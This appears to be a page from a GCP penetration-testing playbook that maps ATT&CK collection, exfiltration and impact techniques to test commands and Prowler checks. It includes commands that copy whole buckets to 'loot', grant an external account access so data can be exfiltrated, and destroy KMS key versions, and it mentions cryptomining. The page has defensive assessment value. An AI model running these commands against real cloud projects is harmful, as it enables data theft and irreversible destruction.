# GCP · Phase 6 — Collection, Exfiltration & Impact

> ATT&CK [TA0009 Collection](../_cloud-base/TA0009-collection.md) +
> [TA0010 Exfiltration](../_cloud-base/TA0010-exfiltration.md) +
> [TA0040 Impact](../_cloud-base/TA0040-impact.md), projected onto GCP. **Impact
> is destructive — demonstrate non-destructively unless explicitly scoped.**

## Collection

#### T1530 Data from Cloud Storage
- **Service/sink:** GCS, BigQuery, Cloud SQL.
  ```sh
  gsutil -m cp -r gs://<bucket> ./loot
  bq query --nouse_legacy_sql 'SELECT * FROM `proj.dataset.table` LIMIT 10'
  ```
- **Positive (secure):** `PERMISSION_DENIED`; uniform bucket-level access +
  scoped IAM (`cloudstorage_bucket_uniform_bucket_level_access`).
- **Negative (vulnerable):** objects/rows returned → data collected (public or
  over-permissioned bucket/dataset — `cloudstorage_bucket_public_access`,
  `bigquery_dataset_public_access`).

## Exfiltration

#### T1537 Transfer Data to Cloud Account
- **Service/sink:** grant your external account read on a bucket, or copy to an
  attacker-owned project; share an image/disk:
  ```sh
  gsutil iam ch user:you@ext:objectViewer gs://<bucket>
  gcloud compute images add-iam-policy-binding <img> --member=user:you@ext --role=roles/compute.imageUser
  ```
- **Positive (secure):** org policy `iam.allowedPolicyMemberDomains` (domain
  restriction) blocks external members. **Negative:** external grant succeeds →
  data/image readable from attacker project.

## Impact

#### T1486 Data Encrypted for Impact · T1485 Data Destruction
- **Service/sink:** Cloud KMS, GCS/disks. Disable/destroy a KMS key version to
  deny access; delete buckets/disks/snapshots.
  ```sh
  gcloud kms keys versions destroy <ver> --key=<k> --keyring=<kr> --location=<l>
  ```
- **Positive (secure):** `PERMISSION_DENIED`; bucket retention/versioning +
  object holds; key-destroy restricted. Prowler `kms_key_rotation_enabled`,
  `cloudstorage_bucket_versioning_enabled`.
- **Negative (vulnerable):** key version destroyable / backups deletable → data
  loss. **Confirm via permission check / dry-run, don't execute in prod.**

#### T1496 Resource Hijacking
Spin up Compute at scale (cryptomining) where quota/billing allows — impact =
cost. Detect via billing alerts / SCC.

---
*Base: [Collection](../_cloud-base/TA0009-collection.md) ·
[Exfiltration](../_cloud-base/TA0010-exfiltration.md) ·
[Impact](../_cloud-base/TA0040-impact.md). Back to [GCP README](README.md).*
